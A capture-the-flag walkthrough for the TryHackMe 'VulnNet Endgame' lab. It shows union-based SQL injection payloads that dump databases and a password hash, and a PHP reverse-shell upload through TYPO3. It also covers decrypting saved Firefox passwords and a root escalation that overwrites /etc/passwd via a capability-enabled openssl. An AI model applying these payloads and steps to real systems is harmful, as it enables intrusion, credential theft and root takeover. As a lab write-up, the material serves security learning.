# 73 - VulnNet Endgame (SQLI, Getcap, Adding user and password to /etc/passwd file)

Room Link --> [https://tryhackme.com/room/vulnnetendgame](https://tryhackme.com/room/vulnnetendgame)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -vvv -n -Pn 10.10.96.76 -p- -T4 -sV

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
```
{% endcode %}

#### Subdomain Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
ffuf -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://vulnnet.thm -H "Host: FUZZ.vulnnet.thm" -fs 65

api
blog
shop
admin1
```
{% endcode %}

We can see that when clicking on a post from the `blog` subdomain there is a get request to the `/vn_internals/api/v2/fetch/?blog=` api.

<figure><img src=".gitbook/assets/image (483).png" alt=""><figcaption></figcaption></figure>

It returns a json with 4 values, “_requested\_id_” “_blog\_id_” “_titles_” and “_status_”, the _requested\_id_ and _blog\_id_ reflect the number from the blog parameter, so I pass a single quote with the number 5 that was passed previously and now it returns _null_ where the number 5 was being reflected, that’s a good sign that we can have something here…

There are 3 columns, and we are able to get the version.

{% hint style="success" %}
I tried using valid numbers for the api like 1,2,3,4 etc but non worked till i used -1.

Always user values that dosent exist for sqli.
{% endhint %}

`-1 UNION SELECT NULL,NULL,@@version-- -` .

<figure><img src=".gitbook/assets/image (484).png" alt=""><figcaption></figcaption></figure>

### DBs / Schema Names

{% code overflow="wrap" lineNumbers="true" %}
```sql
-554 UNION ALL SELECT NULL,NULL,SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 1 OFFSET 0 -- -

-554 UNION ALL SELECT NULL,NULL,SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 1 OFFSET 1 -- -

-554 UNION ALL SELECT NULL,NULL,SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 1 OFFSET 2 -- -

# There are 3 DBS/Schemas.
# OFFSET 0 --> information_schema
# OFFSET 1 --> blog
# OFFSET 2 --> vn_admin

#====================================================
# or we can use group_concat() function.
#====================================================

-554 UNION ALL SELECT NULL,NULL,group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA -- -
```
{% endcode %}

<figure><img src=".gitbook/assets/image (485).png" alt=""><figcaption></figcaption></figure>

### Tables

{% code overflow="wrap" lineNumbers="true" %}
```sql
# for blog
-554 UNION ALL SELECT NULL,NULL,group_concat(table_name) FROM information_schema.tables WHERE table_schema="blog" -- -
# blog_posts, details, metadata, users

# for vn_admin
-554 UNION ALL SELECT NULL,NULL,group_concat(table_name) FROM information_schema.tables WHERE table_schema="vn_admin" -- -
# "backend_layout,be_dashboards,be_groups,be_sessions,be_users,cache_adminpanel_requestcache,cache_adminpanel_requestcache_tags,cache_hash,cache_hash_tags,cache_imagesizes,cache_imagesizes_tags,cache_pages,cache_pages_tags,cache_pagesection,cache_pagesection_tags,cache_rootline,cache_rootline_tags,cache_treelist,fe_groups,fe_sessions,fe_users"
```
{% endcode %}

### Columns

{% code overflow="wrap" lineNumbers="true" %}
```sql
# users table
-554 UNION ALL SELECT NULL,NULL,group_concat(column_name) FROM information_schema.columns WHERE table_name="users" -- -
# "id,username,password"

# for be_users Table
-554 UNION ALL SELECT NULL,NULL,group_concat(column_name) FROM information_schema.columns WHERE table_name="be_users" -- -
# "uid,pid,tstamp,crdate,cruser_id,deleted,disable,starttime,endtime,description,username,avatar,password,admin,usergroup,lang,email,db_mountpoints,options,realName,userMods,allowed_languages,uc,file_mountpoints,file_permissions,workspace_perms,lockToDomain,disableIPlock,TSconfig,lastlogin,createdByAction,usergroup_cached_list,workspace_id,ca"
```
{% endcode %}

### Dumpdata

{% code overflow="wrap" lineNumbers="true" %}
```bash
# for be_users Table
-554 UNION SELECT NULL,NULL,concat(username,password) FROM vn_admin.be_users -- -

chris_w : $argon2i$v=19$m=65536,t=16,p=2$UnlVSEgyMUFnYnJXNXlXdg$j6z3IshmjsN+CwhciRECV2NArQwipqQMIBtYufyM4Rg
```
{% endcode %}

Cracking hash with john

```bash
dking@dking ~/Downloads$ haiti '$argon2i$v=19$m=65536,t=16,p=2$UnlVSEgyMUFnYnJXNXlXdg$j6z3IshmjsN+CwhciRECV2NArQwipqQMIBtYufyM4Rg'                                                                
argon2i [JtR: argon2]

dking@dking ~/Downloads$ cat passwd                                                                             
chris_w:$argon2i$v=19$m=65536,t=16,p=2$UnlVSEgyMUFnYnJXNXlXdg$j6z3IshmjsN+CwhciRECV2NArQwipqQMIBtYufyM4Rg

# use the passwords from the "blog" table as wordlist for john.

```

While John was cracking, i checked the other subdomains:

#### Gobuster enum

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://admin1.vulnnet.thm/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --no-error | grep -v 400

/en 
/vendor 
/fileadmin 
/typo3
```
{% endcode %}

Typo 3 is a CMS, we login with the credentials.

<figure><img src=".gitbook/assets/image (486).png" alt=""><figcaption></figcaption></figure>

`chris_w : vAxWtmNzeTz` .

We can login now.

### Initial Access

* On the admin portal, go to Settings -> Configure Installation Wide Options
* Search for `upload`, edit the deny filter to remove any reference of PHP

<figure><img src=".gitbook/assets/image (474).png" alt=""><figcaption><p>leave it empty.</p></figcaption></figure>

* Goto Filelist tab, click "user\_upload",&#x20;
*

    <figure><img src=".gitbook/assets/image (475).png" alt=""><figcaption><p>upload ph rev shell.</p></figcaption></figure>

    Setup NC listener.
* Navgiate to [http://admin1.vulnnet.thm/fileadmin/user\_upload/shell.php](http://admin1.vulnnet.thm/fileadmin/user\_upload/shell.php)

To execute it.

<figure><img src=".gitbook/assets/image (476).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to System user

There is a `.mozilla` dir in the "/home/system" dir.

```bash
# compress it and send to kali for analysis.
zip /tmpbrowser.zip .mozilla -r
```

IN kali

```bash
dking@dking ~/Downloads/.mozilla/firefox$ l                                                                    
total 76K
drwxr-xr-x  7 dking dking 4.0K Nov 14 09:43  .
drwxr-xr-x  4 dking dking 4.0K Jun 14  2022  ..
drwxr-xr-x 13 dking dking 4.0K Jun 14  2022  2fjnrwth.default-release
drwxr-xr-x  2 dking dking 4.0K Jun 14  2022  2o9vd4oi.default
drwxr-xr-x 13 dking dking 4.0K Jun 14  2022  8mk7ix79.default-release
drwxr-xr-x  3 dking dking 4.0K Jun 14  2022 'Crash Reports'
-rw-r--r--  1 dking dking  39K Nov 14 09:43  firefox_decrypt.py
-rwxr-xr-x  1 dking dking   62 Jun 14  2022  installs.ini
drwxr-xr-x  2 dking dking 4.0K Jun 14  2022 'Pending Pings'
-rwxr-xr-x  1 dking dking  259 Jun 14  2022  profiles.ini
dking@dking ~/Downloads/.mozilla/firefox$ cat profiles.ini                                                     
[Install4F96D1932A9F858E]
Default=8mk7ix79.default-release
Locked=1

[Profile1]
Name=default
IsRelative=1
Path=2o9vd4oi.default
Default=1

[Profile0]
Name=default-release
IsRelative=1
Path=8mk7ix79.default-release

[General]
StartWithLastProfile=1
Version=2

dking@dking ~/Downloads/.mozilla/firefox$ nano profiles.ini                                                    
dking@dking ~/Downloads/.mozilla/firefox$ nano profiles.ini                                                    
dking@dking ~/Downloads/.mozilla/firefox$ python3 /opt/firefox_decrypt.py                                      
Select the Mozilla profile you wish to decrypt
1 -> 9l8sg3lz.default
2 -> rt5aiw6s.default-esr
2

Website:   http://severnaya-station.com
Username: 'admin'
Password: 'xWinter1995x!'

Website:   http://10.10.21.37
Username: 'test'
Password: 'test'
dking@dking ~/Downloads/.mozilla/firefox$ python3 /opt/firefox_decrypt.py                                      
Select the Mozilla profile you wish to decrypt
1 -> 9l8sg3lz.default
2 -> rt5aiw6s.default-esr
1
2023-11-14 09:46:29,477 - ERROR - Couldn't initialize NSS, maybe '/home/dking/.mozilla/firefox/9l8sg3lz.default' is not a valid profile?
dking@dking ~/Downloads/.mozilla/firefox$ python3 /opt/firefox_decrypt.py ./                             12 ↵  
Select the Mozilla profile you wish to decrypt
1 -> 2o9vd4oi.default
2 -> 2fjnrwth.default-release
2

Website:   https://tryhackme.com
Username: 'chris_w@vulnnet.thm'
Password: '8y7TKQDpucKBYhwsb'
dking@dking ~/Downloads/.mozilla/firefox$ 
```

We try thee password for System.

```bash
www-data@vulnnet-endgame:/tmp$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
system:x:1000:1000:system,,,:/home/system:/bin/bash
www-data@vulnnet-endgame:/tmp$ 
```

ssh to System

`system : 8y7TKQDpucKBYhwsb`&#x20;

And it worked.

### Priv  Esc to root

#### Getcapabilities

```bash
system@vulnnet-endgame:~$ getcap / -r 2>/dev/null 
/home/system/Utils/openssl =ep
```

We find out that a version of openssl in our home can be used to escalate to root. As reported from GTFObins, we can use it to write to files. We can use the following instruction to add a new user to the box that has the same privileges as root.

#### Adding user and password to /etc/passwd file

```
echo "root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
cups-pk-helper:x:110:116:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
whoopsie:x:112:117::/nonexistent:/bin/false
kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:114:119::/var/lib/saned:/usr/sbin/nologin
avahi:x:115:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
colord:x:116:121:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:117:7:HPLIP system user,,,:/var/run/hplip:/bin/false
geoclue:x:118:122::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:119:123:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
system:x:1000:1000:system,,,:/home/system:/bin/bash
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
mysql:x:122:127:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:123:65534::/run/sshd:/usr/sbin/nologin
root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash" | ./openssl enc -out "/etc/passwd"
```

In this case, root2's password is mrcake. Just su to root2 and get the last flag.

